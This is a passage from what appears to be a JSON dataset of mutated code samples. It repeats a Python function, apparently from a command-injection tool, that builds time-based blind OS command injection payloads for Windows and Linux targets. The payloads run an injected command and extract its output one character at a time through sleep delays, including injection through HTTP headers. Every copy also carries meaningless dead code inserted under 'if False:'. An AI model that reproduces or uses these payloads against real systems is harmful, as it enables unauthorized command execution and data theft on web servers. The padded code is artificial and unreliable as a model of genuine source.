settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    }
]